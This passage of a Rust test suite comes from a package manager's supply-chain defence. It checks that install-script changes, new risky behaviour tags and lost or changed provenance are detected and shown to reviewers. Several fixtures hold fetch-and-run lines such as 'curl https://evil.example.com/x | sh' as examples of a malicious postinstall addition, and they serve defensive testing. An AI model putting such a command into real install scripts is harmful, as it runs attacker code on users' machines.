        let binding = TrustedDependencyBinding {
            script_hash: Some("sha256-same".into()),
            behavioral_tags_hash: Some("sha256-before".into()),
            behavioral_tags: Some(vec!["crypto".into()]),
            ..Default::default()
        };
        let mut cand = candidate("suspicious", "2.0.0");
        cand.script_hash = Some("sha256-same".into());
        cand.behavioral_tags_hash = Some("sha256-after".into());
        cand.behavioral_tags = Some(vec!["crypto".into(), "eval".into(), "network".into()]);

        let diff = compute_version_diff("1.0.0", &binding, &cand);
        match diff.reason {
            VersionDiffReason::BehavioralTagShift { gained, lost } => {
                assert_eq!(gained, vec!["eval".to_string(), "network".to_string()]);
                assert!(lost.is_empty());
            }
            other => panic!("expected BehavioralTagShift, got {other:?}"),
        }
    }

    #[test]
    fn behavioral_tag_shift_lost_tags_surface() {
        let binding = TrustedDependencyBinding {
            script_hash: Some("sha256-same".into()),
            behavioral_tags_hash: Some("sha256-before".into()),
            behavioral_tags: Some(vec![
                "crypto".into(),
                "eval".into(),
                "network".into(),
                "shell".into(),
            ]),
            ..Default::default()
        };
        let mut cand = candidate("legit", "3.0.0");
        cand.script_hash = Some("sha256-same".into());
        cand.behavioral_tags_hash = Some("sha256-after".into());
        cand.behavioral_tags = Some(vec!["crypto".into(), "network".into()]);

        let diff = compute_version_diff("2.0.0", &binding, &cand);
        match diff.reason {
            VersionDiffReason::BehavioralTagShift { gained, lost } => {
                assert!(gained.is_empty());
                assert_eq!(lost, vec!["eval".to_string(), "shell".to_string()]);
            }
            other => panic!("expected BehavioralTagShift, got {other:?}"),
        }
    }

    #[test]
    fn behavioral_tag_shift_gained_and_lost_together() {
        let binding = TrustedDependencyBinding {
            script_hash: Some("sha256-same".into()),
            behavioral_tags_hash: Some("sha256-before".into()),
            behavioral_tags: Some(vec!["crypto".into(), "filesystem".into()]),
            ..Default::default()
        };
        let mut cand = candidate("mixed", "2.0.0");
        cand.script_hash = Some("sha256-same".into());
        cand.behavioral_tags_hash = Some("sha256-after".into());
        cand.behavioral_tags = Some(vec!["crypto".into(), "network".into(), "shell".into()]);

        let diff = compute_version_diff("1.0.0", &binding, &cand);
        match diff.reason {
            VersionDiffReason::BehavioralTagShift { gained, lost } => {
                assert_eq!(gained, vec!["network".to_string(), "shell".to_string()]);
                assert_eq!(lost, vec!["filesystem".to_string()]);
            }
            other => panic!("expected BehavioralTagShift, got {other:?}"),
        }
    }

    #[test]
    fn behavioral_tags_equal_by_hash_skips_name_set_comparison() {
        // When hashes are both Some and equal, trust the hash — don't
        // re-walk the name sets. Defensive: if the names somehow
        // disagreed with the hash (impossible if the capture used
        // hash_behavioral_tag_set honestly, but we don't want to
        // surface phantom drifts on hash collision-free inputs that
        // genuinely match).
        let binding = TrustedDependencyBinding {
            script_hash: Some("sha256-same".into()),
            behavioral_tags_hash: Some("sha256-tags".into()),
            // Deliberately different from candidate — but the hash
            // says they're equal.
            behavioral_tags: Some(vec!["crypto".into()]),
            ..Default::default()
        };
        let mut cand = candidate("same", "2.0.0");
        cand.script_hash = Some("sha256-same".into());
        cand.behavioral_tags_hash = Some("sha256-tags".into());
        cand.behavioral_tags = Some(vec!["network".into()]);

        let diff = compute_version_diff("1.0.0", &binding, &cand);
        assert_eq!(
            diff.reason,
            VersionDiffReason::NoChange,
            "hash equality must short-circuit to NoChange even if the name sets look different"
        );
    }

    #[test]
    fn provenance_identity_changed() {
        let binding = TrustedDependencyBinding {
            script_hash: Some("sha256-same".into()),
            provenance_at_approval: Some(snapshot(
                "github:axios/axios",
                ".github/workflows/publish.yml",
            )),
            ..Default::default()
        };
        let mut cand = candidate("axios", "1.15.0");
        cand.script_hash = Some("sha256-same".into());
        cand.provenance_at_capture = Some(snapshot(
            "github:evil/axios-fork",
            ".github/workflows/publish.yml",
        ));

        let diff = compute_version_diff("1.14.0", &binding, &cand);
        assert_eq!(
            diff.reason,
            VersionDiffReason::ProvenanceDrift {
                kind: ProvenanceDriftKind::IdentityChanged
            }
        );
    }

    #[test]
    fn provenance_dropped_axios_pattern() {
        // The axios 1.14.1 pattern: prior release had provenance, new
        // release dropped it.
        let binding = TrustedDependencyBinding {
            script_hash: Some("sha256-same".into()),
            provenance_at_approval: Some(snapshot(
                "github:axios/axios",
                ".github/workflows/publish.yml",
            )),
            ..Default::default()
        };
        let mut cand = candidate("axios", "1.14.1");
        cand.script_hash = Some("sha256-same".into());
        cand.provenance_at_capture = Some(snapshot_absent());

        let diff = compute_version_diff("1.14.0", &binding, &cand);
        assert_eq!(
            diff.reason,
            VersionDiffReason::ProvenanceDrift {
                kind: ProvenanceDriftKind::Dropped
            }
        );
    }

    #[test]
    fn provenance_gained_is_informational() {
        // Prior version had no attestation; candidate has one. The
        // drift gate treats this as NoDrift (strictly better signal),
        // but the diff UI surfaces it as `Gained` so the user knows
        // the security posture improved.
        let binding = TrustedDependencyBinding {
            script_hash: Some("sha256-same".into()),
            provenance_at_approval: Some(snapshot_absent()),
            ..Default::default()
        };
        let mut cand = candidate("rising", "2.0.0");
        cand.script_hash = Some("sha256-same".into());
        cand.provenance_at_capture = Some(snapshot(
            "github:rising/package",
            ".github/workflows/publish.yml",
        ));

        let diff = compute_version_diff("1.0.0", &binding, &cand);
        assert_eq!(
            diff.reason,
            VersionDiffReason::ProvenanceDrift {
                kind: ProvenanceDriftKind::Gained
            }
        );
    }

    // ─── Multi-field drift ────────────────────────────────────────

    #[test]
    fn multi_field_drift_script_and_tags() {
        let binding = TrustedDependencyBinding {
            script_hash: Some("sha256-old".into()),
            behavioral_tags_hash: Some("sha256-before".into()),
            behavioral_tags: Some(vec!["crypto".into()]),
            ..Default::default()
        };
        let mut cand = candidate("compromise", "2.0.0");
        cand.script_hash = Some("sha256-new".into());
        cand.behavioral_tags_hash = Some("sha256-after".into());
        cand.behavioral_tags = Some(vec!["crypto".into(), "network".into()]);

        let diff = compute_version_diff("1.0.0", &binding, &cand);
        match diff.reason {
            VersionDiffReason::MultiFieldDrift {
                script_hash,
                tags,
                provenance,
            } => {
                assert!(script_hash);
                assert_eq!(
                    tags,
                    Some(TagShift {
                        gained: vec!["network".into()],
                        lost: vec![],
                    })
                );
                assert_eq!(provenance, None);
            }
            other => panic!("expected MultiFieldDrift, got {other:?}"),
        }
    }

    #[test]
    fn multi_field_drift_all_three_dimensions() {
        // Supply-chain worst-case: script body AND tags AND
        // provenance all rotate.
        let binding = TrustedDependencyBinding {
            script_hash: Some("sha256-old".into()),
            behavioral_tags_hash: Some("sha256-tags-old".into()),
            behavioral_tags: Some(vec!["crypto".into()]),
            provenance_at_approval: Some(snapshot(
                "github:legit/pkg",
                ".github/workflows/publish.yml",
            )),
            ..Default::default()
        };
        let mut cand = candidate("compromise", "2.0.0");
        cand.script_hash = Some("sha256-new".into());
        cand.behavioral_tags_hash = Some("sha256-tags-new".into());
        cand.behavioral_tags = Some(vec!["eval".into(), "network".into(), "shell".into()]);
        cand.provenance_at_capture = Some(snapshot_absent());

        let diff = compute_version_diff("1.0.0", &binding, &cand);
        match diff.reason {
            VersionDiffReason::MultiFieldDrift {
                script_hash,
                tags,
                provenance,
            } => {
                assert!(script_hash);
                assert_eq!(
                    tags,
                    Some(TagShift {
                        gained: vec!["eval".into(), "network".into(), "shell".into()],
                        lost: vec!["crypto".into()],
                    })
                );
                assert_eq!(provenance, Some(ProvenanceDriftKind::Dropped));
            }
            other => panic!("expected MultiFieldDrift, got {other:?}"),
        }
    }

    // ─── Missing-signal edge cases ───────────────────────────────

    #[test]
    fn missing_script_hash_on_either_side_is_no_signal() {
        // Binding lacks script_hash (legacy / pre-Phase-4 upgrade).
        let binding = TrustedDependencyBinding {
            script_hash: None,
            ..Default::default()
        };
        let mut cand = candidate("legacy", "2.0.0");
        cand.script_hash = Some("sha256-new".into());

        let diff = compute_version_diff("1.0.0", &binding, &cand);
        assert_eq!(
            diff.reason,
            VersionDiffReason::NoChange,
            "None binding.script_hash → no signal on that dimension"
        );

        // Now the candidate lacks it.
        let binding2 = TrustedDependencyBinding {
            script_hash: Some("sha256-old".into()),
            ..Default::default()
        };
        let mut cand2 = candidate("other", "2.0.0");
        cand2.script_hash = None;

        let diff2 = compute_version_diff("1.0.0", &binding2, &cand2);
        assert_eq!(diff2.reason, VersionDiffReason::NoChange);
    }

    #[test]
    fn missing_behavioral_tags_on_either_side_is_no_signal() {
        // Binding lacks tags entirely.
        let binding = TrustedDependencyBinding {
            script_hash: Some("sha256-same".into()),
            behavioral_tags_hash: None,
            behavioral_tags: None,
            ..Default::default()
        };
        let mut cand = candidate("no-tags-before", "2.0.0");
        cand.script_hash = Some("sha256-same".into());
        cand.behavioral_tags_hash = Some("sha256-after".into());
        cand.behavioral_tags = Some(vec!["network".into()]);

        let diff = compute_version_diff("1.0.0", &binding, &cand);
        assert_eq!(
            diff.reason,
            VersionDiffReason::NoChange,
            "missing binding.behavioral_tags → can't claim drift on that dimension"
        );
    }

    #[test]
    fn both_sides_have_no_provenance_is_no_change() {
        let binding = TrustedDependencyBinding {
            script_hash: Some("sha256-same".into()),
            provenance_at_approval: None,
            ..Default::default()
        };
        let mut cand = candidate("no-prov", "2.0.0");
        cand.script_hash = Some("sha256-same".into());
        cand.provenance_at_capture = None;

        let diff = compute_version_diff("1.0.0", &binding, &cand);
        assert_eq!(diff.reason, VersionDiffReason::NoChange);
    }

    #[test]
    fn prior_had_snapshot_absent_candidate_missing_entirely_is_no_change() {
        // Prior captured `present: false` (we fetched, registry said
        // no attestation). Candidate is None (fetcher degraded). No
        // drift signal — the `(Some, None)` case is documented as
        // pass-through.
        let binding = TrustedDependencyBinding {
            script_hash: Some("sha256-same".into()),
            provenance_at_approval: Some(snapshot_absent()),
            ..Default::default()
        };
        let mut cand = candidate("degraded", "2.0.0");
        cand.script_hash = Some("sha256-same".into());
        cand.provenance_at_capture = None;

        let diff = compute_version_diff("1.0.0", &binding, &cand);
        assert_eq!(diff.reason, VersionDiffReason::NoChange);
    }

    // ─── latest_binding_for_name (workspace-side helper, exercised
    //     here via the full P7 integration surface) ────────────────

    #[test]
    fn latest_binding_selects_strictly_less_than_candidate() {
        use lpm_workspace::TrustedDependencies;
        use std::collections::HashMap;

        let mut map = HashMap::new();
        map.insert(
            "axios@1.14.0".into(),
            TrustedDependencyBinding {
                script_hash: Some("sha256-v1140".into()),
                ..Default::default()
            },
        );
        map.insert(
            "axios@1.13.5".into(),
            TrustedDependencyBinding {
                script_hash: Some("sha256-v1135".into()),
                ..Default::default()
            },
        );
        let td = TrustedDependencies::Rich(map);

        // Candidate 1.14.1 → lex-max strictly-less-than is 1.14.0.
        let (v, b) = td.latest_binding_for_name("axios", "1.14.1").unwrap();
        assert_eq!(v, "1.14.0");
        assert_eq!(b.script_hash.as_deref(), Some("sha256-v1140"));

        // Candidate 1.14.0 → strictly-less-than → 1.13.5.
        let (v2, _) = td.latest_binding_for_name("axios", "1.14.0").unwrap();
        assert_eq!(v2, "1.13.5");

        // Candidate 1.13.5 → no prior (can't pick itself).
        assert!(td.latest_binding_for_name("axios", "1.13.5").is_none());

        // Candidate 1.12.0 → nothing is strictly less.
        assert!(td.latest_binding_for_name("axios", "1.12.0").is_none());

        // Unknown package name → None.
        assert!(td.latest_binding_for_name("express", "5.0.0").is_none());
    }

    #[test]
    fn latest_binding_skips_at_star_preserve_key() {
        use lpm_workspace::TrustedDependencies;
        use std::collections::HashMap;

        // A legacy upgrade preserve key `axios@*` must NOT be picked
        // as a prior version — `*` lex-sorts higher than any concrete
        // digit, so a naive max would return it.
        let mut map = HashMap::new();
        map.insert("axios@*".into(), TrustedDependencyBinding::default());
        map.insert(
            "axios@1.13.0".into(),
            TrustedDependencyBinding {
                script_hash: Some("sha256-v1130".into()),
                ..Default::default()
            },
        );
        let td = TrustedDependencies::Rich(map);

        let (v, _) = td.latest_binding_for_name("axios", "1.14.0").unwrap();
        assert_eq!(v, "1.13.0", "`@*` preserve keys must be excluded");
    }

    #[test]
    fn latest_binding_handles_scoped_package_names() {
        use lpm_workspace::TrustedDependencies;
        use std::collections::HashMap;

        let mut map = HashMap::new();
        map.insert(
            "@scope/pkg@1.0.0".into(),
            TrustedDependencyBinding::default(),
        );
        let td = TrustedDependencies::Rich(map);

        let (v, _) = td.latest_binding_for_name("@scope/pkg", "1.1.0").unwrap();
        assert_eq!(v, "1.0.0");
    }

    #[test]
    fn latest_binding_returns_none_for_legacy_variant() {
        use lpm_workspace::TrustedDependencies;

        let td = TrustedDependencies::Legacy(vec!["axios".into()]);
        assert!(td.latest_binding_for_name("axios", "1.0.0").is_none());
    }

    // ─── Rendering layer — terse hints ────────────────────────────

    fn mk_diff(reason: VersionDiffReason) -> VersionDiff {
        VersionDiff {
            prior_version: "1.0.0".into(),
            candidate_version: "2.0.0".into(),
            reason,
        }
    }

    #[test]
    fn terse_hint_returns_none_for_no_change() {
        let diff = mk_diff(VersionDiffReason::NoChange);
        assert!(render_terse_hint(&diff, "pkg").is_none());
    }

    #[test]
    fn terse_hint_script_hash_drift() {
        let diff = mk_diff(VersionDiffReason::ScriptHashDrift);
        let line = render_terse_hint(&diff, "esbuild").unwrap();
        assert_eq!(
            line,
            "  esbuild@2.0.0 — script content changed since v1.0.0"
        );
    }

    #[test]
    fn terse_hint_behavioral_tag_gained_surfaces_delta() {
        // Ship criterion 2, terse rendering: the gained tags MUST
        // appear verbatim in the install output so the user sees
        // "+network +eval" without running approve-builds.
        let diff = mk_diff(VersionDiffReason::BehavioralTagShift {
            gained: vec!["eval".into(), "network".into()],
            lost: vec![],
        });
        let line = render_terse_hint(&diff, "suspicious").unwrap();
        assert!(
            line.contains("+network"),
            "+network must appear in terse hint — got {line}"
        );
        assert!(
            line.contains("+eval"),
            "+eval must appear in terse hint — got {line}"
        );
        assert!(line.contains("since v1.0.0"));
    }

    #[test]
    fn terse_hint_behavioral_tag_both_gained_and_lost() {
        let diff = mk_diff(VersionDiffReason::BehavioralTagShift {
            gained: vec!["network".into()],
            lost: vec!["crypto".into()],
        });
        let line = render_terse_hint(&diff, "mixed").unwrap();
        assert!(line.contains("+network"));
        assert!(line.contains("-crypto"));
    }

    #[test]
    fn terse_hint_provenance_dropped_names_axios_pattern() {
        // "axios-pattern signal" is a load-bearing phrase in the doc:
        // it's the recognizable shorthand ops teams can grep on.
        let diff = mk_diff(VersionDiffReason::ProvenanceDrift {
            kind: ProvenanceDriftKind::Dropped,
        });
        let line = render_terse_hint(&diff, "axios").unwrap();
        assert!(line.contains("provenance dropped"));
        assert!(line.contains("axios-pattern"));
    }

    #[test]
    fn terse_hint_provenance_identity_changed() {
        let diff = mk_diff(VersionDiffReason::ProvenanceDrift {
            kind: ProvenanceDriftKind::IdentityChanged,
        });
        let line = render_terse_hint(&diff, "pkg").unwrap();
        assert!(line.contains("provenance identity changed"));
    }

    #[test]
    fn terse_hint_multi_field_drift_lists_dimensions() {
        let diff = mk_diff(VersionDiffReason::MultiFieldDrift {
            script_hash: true,
            tags: Some(TagShift {
                gained: vec!["network".into()],
                lost: vec![],
            }),
            provenance: Some(ProvenanceDriftKind::Dropped),
        });
        let line = render_terse_hint(&diff, "compromise").unwrap();
        assert!(line.contains("script + tags + provenance changed"));
        assert!(line.contains("since v1.0.0"));
    }

    // ─── Rendering layer — preflight card ────────────────────────

    fn bodies(pairs: &[(&str, &str)]) -> PhaseBodies {
        pairs
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect()
    }

    #[test]
    fn preflight_card_returns_none_for_no_change() {
        let diff = mk_diff(VersionDiffReason::NoChange);
        assert!(render_preflight_card(&diff, "pkg", None, None).is_none());
    }

    #[test]
    fn preflight_card_script_hash_drift_renders_unified_diff() {
        // Ship criterion 1: "the exact added line before any execution."
        // Prior postinstall is `echo hi`; candidate adds `curl X | sh`
        // after it. The unified diff must surface the added line.
        let prior = bodies(&[("postinstall", "echo hi\n")]);
        let candidate = bodies(&[(
            "postinstall",
            "echo hi\ncurl https://evil.example.com/x | sh\n",
        )]);
        let diff = mk_diff(VersionDiffReason::ScriptHashDrift);
        let card = render_preflight_card(&diff, "evil", Some(&prior), Some(&candidate)).unwrap();

        assert!(card.contains("evil@2.0.0 — changes since v1.0.0:"));
        assert!(
            card.contains("+curl https://evil.example.com/x | sh"),
            "the exact added line must appear in the card — got:\n{card}"
        );
        // Unified-diff headers should identify the phase so the
        // reviewer can see WHICH phase drifted.
        assert!(card.contains("scripts.postinstall"));
    }

    #[test]
    fn preflight_card_script_drift_degrades_when_prior_missing_from_store() {
        // Common `lpm cache clean` scenario: the prior tarball was
        // evicted. Card must degrade gracefully rather than crash or
        // emit a misleading empty diff.
        let candidate = bodies(&[("postinstall", "node build.js\n")]);
        let diff = mk_diff(VersionDiffReason::ScriptHashDrift);
        let card = render_preflight_card(&diff, "pkg", None, Some(&candidate)).unwrap();
        assert!(card.contains("prior or candidate scripts not in store"));
    }

    #[test]
    fn preflight_card_behavioral_tag_section_shows_gained_and_lost() {
        let diff = mk_diff(VersionDiffReason::BehavioralTagShift {
            gained: vec!["eval".into(), "network".into()],
            lost: vec!["crypto".into()],
        });
        let card = render_preflight_card(&diff, "pkg", None, None).unwrap();
        // Deterministic order: gained then lost, each block in the
        // order provided (which is sorted ascending).
        let eval_pos = card.find("+ eval").expect("+ eval missing");
        let network_pos = card.find("+ network").expect("+ network missing");
        let crypto_pos = card.find("- crypto").expect("- crypto missing");
        assert!(eval_pos < network_pos);
        assert!(network_pos < crypto_pos);
    }

    #[test]
    fn preflight_card_provenance_dropped_section() {
        let diff = mk_diff(VersionDiffReason::ProvenanceDrift {
            kind: ProvenanceDriftKind::Dropped,
        });
        let card = render_preflight_card(&diff, "axios", None, None).unwrap();
        assert!(card.contains("Provenance dropped"));
        assert!(card.contains("axios-pattern signal"));
    }

    #[test]
    fn preflight_card_multi_field_renders_each_dimension() {
        let prior = bodies(&[("postinstall", "echo safe\n")]);
        let candidate = bodies(&[("postinstall", "echo safe\ncurl evil.example | sh\n")]);
        let diff = mk_diff(VersionDiffReason::MultiFieldDrift {
            script_hash: true,
            tags: Some(TagShift {
                gained: vec!["eval".into()],
                lost: vec![],
            }),
            provenance: Some(ProvenanceDriftKind::Dropped),
        });
        let card =
            render_preflight_card(&diff, "compromise", Some(&prior), Some(&candidate)).unwrap();

        // All three dimensions must appear.
        assert!(card.contains("Script content changed"));
        assert!(card.contains("+curl evil.example | sh"));
        assert!(card.contains("+ eval"));
        assert!(card.contains("Provenance dropped"));
    }

    #[test]
    fn preflight_card_only_diffs_changed_phases() {
        // A package with drift in postinstall but identical install
        // and preinstall should only emit a unified-diff section for
        // postinstall — no empty `--- / +++` headers for equal
        // phases.
        let prior = bodies(&[
            ("preinstall", "echo pre\n"),
            ("install", "echo in\n"),
            ("postinstall", "echo post\n"),
        ]);
        let candidate = bodies(&[
            ("preinstall", "echo pre\n"),
            ("install", "echo in\n"),
            ("postinstall", "echo post\ncurl X | sh\n"),
        ]);
        let diff = mk_diff(VersionDiffReason::ScriptHashDrift);
        let card = render_preflight_card(&diff, "partial", Some(&prior), Some(&candidate)).unwrap();

        assert!(card.contains("scripts.postinstall"));
        assert!(
            !card.contains("scripts.preinstall"),
            "preinstall is unchanged; its header must NOT appear — got:\n{card}"
        );
        assert!(
            !card.contains("scripts.install (v"),
            "install is unchanged; its header must NOT appear — got:\n{card}"
        );
    }

    #[test]
    fn phase_bodies_from_pairs_preserves_all_entries() {
        let pairs = vec![
            ("postinstall".to_string(), "cmd-a".to_string()),
            ("preinstall".to_string(), "cmd-b".to_string()),
        ];
        let map = phase_bodies_from_pairs(pairs);
        assert_eq!(map.get("postinstall").map(String::as_str), Some("cmd-a"));
        assert_eq!(map.get("preinstall").map(String::as_str), Some("cmd-b"));
        assert_eq!(map.len(), 2);
    }

    // ─── JSON serialization (Phase 46 P7 Chunk 4) ─────────────────

    #[test]
    fn version_diff_reason_wire_strings_are_kebab_case() {
        // Pin the wire contract; agents grep on these.
        assert_eq!(
            version_diff_reason_wire(&VersionDiffReason::NoChange),
            "no-change"
        );
        assert_eq!(
            version_diff_reason_wire(&VersionDiffReason::ScriptHashDrift),
            "script-hash-drift"
        );
        assert_eq!(
            version_diff_reason_wire(&VersionDiffReason::BehavioralTagShift {
                gained: vec![],
                lost: vec![],
            }),
            "behavioral-tag-shift"
        );
        assert_eq!(
            version_diff_reason_wire(&VersionDiffReason::ProvenanceDrift {
                kind: ProvenanceDriftKind::Dropped,
            }),
            "provenance-drift"
        );
        assert_eq!(
            version_diff_reason_wire(&VersionDiffReason::MultiFieldDrift {
                script_hash: false,
                tags: None,
                provenance: None,
            }),
            "multi-field-drift"
        );
    }

    #[test]
    fn provenance_drift_kind_wire_strings_are_kebab_case() {
        assert_eq!(
            provenance_drift_kind_wire(&ProvenanceDriftKind::IdentityChanged),
            "identity-changed"
        );
        assert_eq!(
            provenance_drift_kind_wire(&ProvenanceDriftKind::Dropped),
            "dropped"
        );
        assert_eq!(
            provenance_drift_kind_wire(&ProvenanceDriftKind::Gained),
            "gained"
        );
    }

    fn diff_for(reason: VersionDiffReason) -> VersionDiff {
        VersionDiff {
            prior_version: "1.0.0".into(),
            candidate_version: "2.0.0".into(),
            reason,
        }
    }

    #[test]
    fn version_diff_to_json_no_change_emits_all_keys_with_appropriate_nulls() {
        // Stable contract: even NoChange emits the same keys so
        // agents read uniformly. `script_hash_drift` is a bool
        // (false), the other dimensions are explicit null.
        let v = version_diff_to_json(&diff_for(VersionDiffReason::NoChange));
        assert_eq!(v["prior_version"], serde_json::json!("1.0.0"));
        assert_eq!(v["candidate_version"], serde_json::json!("2.0.0"));
        assert_eq!(v["reason"], serde_json::json!("no-change"));
        assert_eq!(v["script_hash_drift"], serde_json::json!(false));
        assert!(v["behavioral_tags_added"].is_null());
        assert!(v["behavioral_tags_removed"].is_null());
        assert!(v["provenance_drift_kind"].is_null());
    }

    #[test]
    fn version_diff_to_json_script_hash_drift_alone() {
        let v = version_diff_to_json(&diff_for(VersionDiffReason::ScriptHashDrift));
        assert_eq!(v["reason"], serde_json::json!("script-hash-drift"));
        assert_eq!(v["script_hash_drift"], serde_json::json!(true));
        assert!(v["behavioral_tags_added"].is_null());
        assert!(v["behavioral_tags_removed"].is_null());
        assert!(v["provenance_drift_kind"].is_null());
    }

    #[test]
    fn version_diff_to_json_behavioral_tag_shift_emits_arrays() {
        let v = version_diff_to_json(&diff_for(VersionDiffReason::BehavioralTagShift {
            gained: vec!["eval".into(), "network".into()],
            lost: vec!["crypto".into()],
        }));
        assert_eq!(v["reason"], serde_json::json!("behavioral-tag-shift"));
        assert_eq!(v["script_hash_drift"], serde_json::json!(false));
        assert_eq!(
            v["behavioral_tags_added"],
            serde_json::json!(["eval", "network"])
        );
        assert_eq!(v["behavioral_tags_removed"], serde_json::json!(["crypto"]));
        assert!(v["provenance_drift_kind"].is_null());
    }

    #[test]
    fn version_diff_to_json_behavioral_tag_shift_only_gained_still_emits_empty_lost() {
        // Distinguish "tag dimension drifted, only gained" (empty
        // array on lost) from "tag dimension didn't drift" (null
        // on both). Agents need this signal.
        let v = version_diff_to_json(&diff_for(VersionDiffReason::BehavioralTagShift {
            gained: vec!["network".into()],
            lost: vec![],
        }));
        assert_eq!(v["behavioral_tags_added"], serde_json::json!(["network"]));
        assert_eq!(v["behavioral_tags_removed"], serde_json::json!([]));
    }

    #[test]
    fn version_diff_to_json_provenance_dropped() {
        let v = version_diff_to_json(&diff_for(VersionDiffReason::ProvenanceDrift {
            kind: ProvenanceDriftKind::Dropped,
        }));
        assert_eq!(v["reason"], serde_json::json!("provenance-drift"));
        assert_eq!(v["provenance_drift_kind"], serde_json::json!("dropped"));
        assert_eq!(v["script_hash_drift"], serde_json::json!(false));
        assert!(v["behavioral_tags_added"].is_null());
        assert!(v["behavioral_tags_removed"].is_null());
    }

    #[test]
    fn version_diff_to_json_provenance_identity_changed() {
        let v = version_diff_to_json(&diff_for(VersionDiffReason::ProvenanceDrift {
            kind: ProvenanceDriftKind::IdentityChanged,
        }));
        assert_eq!(
            v["provenance_drift_kind"],
            serde_json::json!("identity-changed")
        );
    }

    #[test]
    fn version_diff_to_json_provenance_gained() {
        let v = version_diff_to_json(&diff_for(VersionDiffReason::ProvenanceDrift {
            kind: ProvenanceDriftKind::Gained,
        }));
        assert_eq!(v["provenance_drift_kind"], serde_json::json!("gained"));
    }

    #[test]
    fn version_diff_to_json_multi_field_emits_each_dimension() {
        let v = version_diff_to_json(&diff_for(VersionDiffReason::MultiFieldDrift {
            script_hash: true,
            tags: Some(TagShift {
                gained: vec!["network".into()],
                lost: vec![],
            }),
            provenance: Some(ProvenanceDriftKind::Dropped),
        }));
        assert_eq!(v["reason"], serde_json::json!("multi-field-drift"));
        assert_eq!(v["script_hash_drift"], serde_json::json!(true));
        assert_eq!(v["behavioral_tags_added"], serde_json::json!(["network"]));
        assert_eq!(v["behavioral_tags_removed"], serde_json::json!([]));
        assert_eq!(v["provenance_drift_kind"], serde_json::json!("dropped"));
    }

    #[test]
    fn version_diff_to_json_multi_field_with_only_some_dimensions_nulls_others() {
        // MultiFieldDrift with script_hash + provenance but tags
        // didn't drift in this multi-field case → tags fields null,
        // not empty arrays. Agents differentiate "tags didn't
        // drift" from "tags drifted to empty".
        let v = version_diff_to_json(&diff_for(VersionDiffReason::MultiFieldDrift {
            script_hash: true,
            tags: None,
            provenance: Some(ProvenanceDriftKind::IdentityChanged),
        }));
        assert_eq!(v["script_hash_drift"], serde_json::json!(true));
        assert!(v["behavioral_tags_added"].is_null());
        assert!(v["behavioral_tags_removed"].is_null());
        assert_eq!(
            v["provenance_drift_kind"],
            serde_json::json!("identity-changed")
        );
    }

    // ─── blocked_to_json + version_diff integration ───────────────

    fn blocked_with(
        name: &str,
        version: &str,
        script_hash: Option<&str>,
    ) -> crate::build_state::BlockedPackage {
        crate::build_state::BlockedPackage {
            name: name.into(),
            version: version.into(),
            integrity: Some(format!("sha512-{name}-{version}")),
            script_hash: script_hash.map(String::from),
            phases_present: vec!["postinstall".into()],
            binding_drift: false,
            static_tier: Some(lpm_security::triage::StaticTier::Green),
            provenance_at_capture: None,
            published_at: None,
            behavioral_tags_hash: None,
            behavioral_tags: None,
        }
    }

    #[test]
    fn blocked_to_json_emits_null_version_diff_when_no_prior_binding() {
        use lpm_workspace::TrustedDependencies;
        let bp = blocked_with("esbuild", "0.25.1", Some("sha256-x"));
        let v = blocked_to_json(&bp, &TrustedDependencies::default());
        assert!(
            v["version_diff"].is_null(),
            "no prior binding → version_diff must be null"
        );
        // Existing fields still present.
        assert_eq!(v["name"], serde_json::json!("esbuild"));
        assert_eq!(v["static_tier"], serde_json::json!("green"));
    }

    #[test]
    fn blocked_to_json_emits_no_change_object_when_prior_matches() {
        use lpm_workspace::{TrustedDependencies, TrustedDependencyBinding};
        use std::collections::HashMap;

        let bp = blocked_with("stable", "2.0.0", Some("sha256-same"));
        let mut map = HashMap::new();
        map.insert(
            "stable@1.0.0".into(),
            TrustedDependencyBinding {
                script_hash: Some("sha256-same".into()),
                ..Default::default()
            },
        );
        let trusted = TrustedDependencies::Rich(map);

        let v = blocked_to_json(&bp, &trusted);
        // Prior exists → emit the object even though reason is
        // no-change. Distinguishes "we found a prior at v1.0.0 and
        // it matches" from "no prior to compare".
        assert!(v["version_diff"].is_object());
        assert_eq!(v["version_diff"]["reason"], serde_json::json!("no-change"));
        assert_eq!(
            v["version_diff"]["prior_version"],
            serde_json::json!("1.0.0")
        );
        assert_eq!(
            v["version_diff"]["candidate_version"],
            serde_json::json!("2.0.0")
        );
    }

    #[test]
    fn blocked_to_json_emits_full_diff_when_prior_drifts() {
        use lpm_workspace::{TrustedDependencies, TrustedDependencyBinding};
        use std::collections::HashMap;

        let bp = blocked_with("esbuild", "0.25.2", Some("sha256-new"));
        let mut map = HashMap::new();
        map.insert(
            "esbuild@0.25.1".into(),
            TrustedDependencyBinding {
                script_hash: Some("sha256-old".into()),
                ..Default::default()
            },
        );
        let trusted = TrustedDependencies::Rich(map);

        let v = blocked_to_json(&bp, &trusted);
        let vd = &v["version_diff"];
        assert_eq!(vd["reason"], serde_json::json!("script-hash-drift"));
        assert_eq!(vd["prior_version"], serde_json::json!("0.25.1"));
        assert_eq!(vd["candidate_version"], serde_json::json!("0.25.2"));
        assert_eq!(vd["script_hash_drift"], serde_json::json!(true));
    }
}
